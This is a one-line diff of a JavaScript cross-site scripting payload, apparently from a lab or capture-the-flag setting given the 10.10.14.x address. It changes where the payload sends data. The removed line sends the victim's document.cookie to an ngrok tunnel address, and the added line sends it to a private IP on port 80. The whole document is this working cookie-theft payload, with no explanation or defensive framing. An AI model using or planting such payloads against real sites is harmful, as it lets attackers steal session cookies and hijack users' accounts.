@@ -1,1 +1,1 @@
-new Image().src='https://15ed-190-114-33-103.ngrok-free.app?cookie='+document.cookie
+new Image().src='http://10.10.14.23:80?cookie='+document.cookie
